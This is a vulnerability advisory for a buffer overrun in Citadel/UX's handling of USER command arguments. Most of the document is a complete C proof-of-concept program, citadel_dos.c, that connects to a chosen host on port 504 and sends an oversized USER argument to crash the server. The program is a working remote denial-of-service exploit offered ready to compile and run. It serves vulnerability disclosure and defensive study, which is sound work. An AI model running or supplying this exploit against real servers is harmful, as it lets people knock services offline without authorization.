source: http://www.securityfocus.com/bid/10833/info

A buffer overrun vulnerability is reported for Citadel/UX. The problem occurs due to insufficient bounds checking when processing 'USER' command arguments.

An anonymous remote attacker may be capable of exploiting this issue to execute arbitrary code. This however has not been confirmed. Failed exploit attempts may result in a denial of service.

----------------- citadel_dos.c -----------------
/* citadel_dos.c
 *
 * Citadel/UX Remote DoS exploit (Proof of Concept)
 *
 * Tested in Slackware 9.0.0 / 9.1.0 / 10.0.0
 *
 * by CoKi <coki@nosystem.com.ar>
 * No System Group - http://www.nosystem.com.ar
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <getopt.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define BUFFERSIZE 96+1
#define ERROR -1
#define TIMEOUT 3
#define PORT 504

int connect_timeout(int sfd, struct sockaddr *serv_addr,
  socklen_t addrlen, int timeout);
void use(char *program);

int main(int argc, char *argv[]) {
        char buffer[BUFFERSIZE], *p, temp[BUFFERSIZE];
        int sockfd;
        struct hostent *he;
        struct sockaddr_in dest_dir;

        if(argc != 2) use(argv[0]);

        p = buffer;

        printf("\n Citadel/UX Remote DoS exploit (Proof of Concept)\n");
        printf(" by CoKi <coki@nosystem.com.ar>\n\n");

      memset(p, 'A', 96);
        p += 92;
        *p = '\0';

        printf(" [+] verifying host:\t");
        fflush(stdout);

        if((he=gethostbyname(argv[1])) == NULL) {
                herror("Error");
                printf("\n");
                exit(1);
        }

        printf("OK\n");

        if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == ERROR) {
                perror("Error");
                printf("\n");
                exit(1);
        }

        dest_dir.sin_family = AF_INET;
        dest_dir.sin_port = htons(PORT);
        dest_dir.sin_addr = *((struct in_addr *)he->h_addr);
        bzero(&(dest_dir.sin_zero), 8);

        printf(" [+] conecting...\t");
        fflush(stdout);

        if(connect_timeout(sockfd, (struct sockaddr *)&dest_dir,
                sizeof(struct sockaddr), TIMEOUT) == ERROR) {

                printf("Closed\n\n");
                exit(1);
        }

        printf("OK\n");

        printf(" [+] sending exploit...\t");
        fflush(stdout);

        recv(sockfd, temp, sizeof(temp), 0);
        send(sockfd, "USER ", 5, 0);
        send(sockfd, buffer, strlen(buffer), 0);
        send(sockfd, "\n", 1, 0);
        close(sockfd);

        printf("OK\n\n");
}

int connect_timeout(int sfd, struct sockaddr *serv_addr,
  socklen_t addrlen, int timeout) {

  int res, slen, flags;
  struct timeval tv;
  struct sockaddr_in addr;
  fd_set rdf, wrf;

  fcntl(sfd, F_SETFL, O_NONBLOCK);

  res = connect(sfd, serv_addr, addrlen);

  if (res >= 0) return res;

  FD_ZERO(&rdf);
  FD_ZERO(&wrf);

  FD_SET(sfd, &rdf);
  FD_SET(sfd, &wrf);
  bzero(&tv, sizeof(tv));
  tv.tv_sec = timeout;

  if (select(sfd + 1, &rdf, &wrf, 0, &tv) <= 0)
    return -1;

  if (FD_ISSET(sfd, &wrf) || FD_ISSET(sfd, &rdf)) {
    slen = sizeof(addr);
    if (getpeername(sfd, (struct sockaddr*)&addr, &slen) == -1)
    return -1;

    flags = fcntl(sfd, F_GETFL, NULL);
    fcntl(sfd, F_SETFL, flags & ~O_NONBLOCK);

    return 0;
  }

  return -1;
}

void use(char *program) {
        printf("Use: %s <host>\n", program);
        exit(1);
}
